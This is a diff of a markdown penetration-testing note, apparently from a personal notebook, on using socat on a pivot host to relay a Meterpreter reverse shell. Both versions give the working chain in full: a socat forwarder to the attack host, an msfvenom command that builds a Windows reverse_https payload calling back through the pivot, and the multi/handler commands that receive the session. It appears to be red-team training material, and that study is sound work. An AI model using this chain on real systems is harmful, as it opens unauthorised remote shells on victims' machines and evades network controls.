@@ -1,31 +1,33 @@
-## Socat Reverse Shell Redirection
+# Socat Redirection — Reverse Shell
 
-Direct routing to `<ATTACK_IP>` is blocked but the target can reach `<PIVOT_IP>`. **Socat** acts as a bidirectional relay between the target and the attack host listener without requiring SSH tunneling.
+Socat as a dumb pipe redirector on the pivot — no SSH needed, no Meterpreter required. Traffic hits pivot:8080 → forwards to your attack host:80.
 
-Establish a listener on the pivot host to fork and forward traffic to the attack host
+Start socat on the pivot — `fork` keeps it alive for multiple connections:
 
-```
-socat TCP4-LISTEN:<PORT>,fork TCP4:<ATTACK_IP>:<PORT>
-```
-
-Generate a payload that calls back to the redirector IP and port on the pivot host
-
-```
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IP> -f exe -o <FILE_PATH> LPORT=<PORT>
+```bash
+socat TCP4-LISTEN:8080,fork TCP4:<ATTACK_HOST_IP>:80
 ```
 
-Configure the multi-handler on the attack host to receive the redirected session
+Generate payload pointing at the pivot's internal IP and socat's listening port:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_INTERNAL_IP> LPORT=8080 -f exe -o <PAYLOAD>.exe
+```
+
+MSF listener on attack host — listens on the port socat is forwarding to:
 
 ```
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set lhost 0.0.0.0
-set lport <PORT>
+set lport 80
 run
 ```
 
-- Socat
-    
-    - `socat TCP4-LISTEN:<PORT>,fork TCP4:<ATTACK_IP>:<PORT>`
-    - Prefer when SSH is unavailable or a simple bidirectional pipe is required.
-- **Payload UUID tracking** fails silently if the Metasploit database is not connected.
+Flow: `Windows → pivot:8080 → socat → attack host:80 → MSF`
+
+Session source will show the pivot's IP (not the Windows host) — expected.
+
+> [!tip] Socat is simpler than SSH remote forwarding when you just need a dumb redirector and don't want to deal with SSH keys or creds on the pivot. If socat isn't installed: `apt install socat` or `yum install socat`.
+
+> [!warning] `fork` is required — without it socat exits after the first connection. Always include it for reverse shell redirectors.
